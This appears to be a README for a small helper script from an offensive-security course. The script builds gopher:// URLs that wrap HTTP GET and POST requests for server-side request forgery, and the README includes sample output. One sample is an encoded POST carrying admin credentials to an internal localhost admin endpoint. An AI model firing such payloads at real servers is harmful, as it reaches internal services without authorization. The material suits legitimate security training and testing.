Gopher HTTP requests (POST/GET)

URL: gopher: // <host>:<port>/<gopher-path>_ followed by TCP data stream

Tip for determing POST request length:

└─$ echo "username=admin&password=admin" | wc -c 
 
 30
 
 Subtract 1 from this result. = 29 -> Then add this to content length header.

Example output:

----------

└─$ python3 gopher-requests.py

    1. Gopher GET Request
    2. Gopher POST Request
    
[*] Please select GET (1) or POST (2) request: 1

[x] Gopher GET Request: 
gopher://localhost:80/_GET%20/%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A


    1. Gopher GET Request
    2. Gopher POST Request
    
[*] Please select GET (1) or POST (2) request: 2

[?] Informational: The four HTTP headers above are required for POST requests, namely POST, Host, Content-Type and Content-Length. If it is missing, an error will be reported, but GET does not use it.

[x] Gopher POST Request: 
gopher://127.0.0.1:80/_POST%20/admin%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2029%0D%0A%0D%0Ausername%3Dadmin%26password%3Dadmin%0D%0A

----------

Update: This script was helpful during a recent offensive-security course I took, I thought it would be nice to put it out in the universe. It will help you form GET and POST requests that will be able to be used in SSRF.

